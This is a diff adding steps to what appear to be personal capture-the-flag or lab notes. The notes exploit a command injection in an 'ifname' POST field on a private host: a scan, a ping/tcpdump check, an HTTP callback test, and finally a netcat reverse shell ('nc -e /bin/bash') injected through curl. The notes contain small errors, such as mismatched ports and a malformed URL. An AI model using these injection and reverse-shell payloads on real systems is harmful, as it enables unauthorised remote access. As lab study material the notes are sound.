@@ -2,4 +2,16 @@
 2. nmap -sS -sV -sC -p 1337 -vvv -oN scan_badwith 10.0.160.83
 3. we used curl -X GET http://10.0.160:83:1337/
 4. curl -d 'ifname=wlan0' http://10.0.160.83:1337/
-
+5. injection command, but I don't see output, 
+6. apply command tcpdump -i tun0 icpm; i:interface.
+icpm: internet control protocol message.
+7. send curl -d 'ifname=;ping -c2 10.10.1.234;' http://10.0.160.83:1337
+8. I saw the command detect
+9.now. you can open server with: python -m http.server 8080
+10. and send command: curl -d 'ifname=;curl http://10.10.1.234:8080;' http://10.0.160.83:1337
+11. we've demostred output command.
+11.2 I must reeplace ' by " and command ; by $()
+in my case, search google command injection examples. trying
+12. try reverse shell with netcat:
+nc -nlvp 444 listen
+and insert command in request curl -d 'ifname=;nc -e /bin/bash 10.10.1.234 44;' http://10.0.160.83:1337
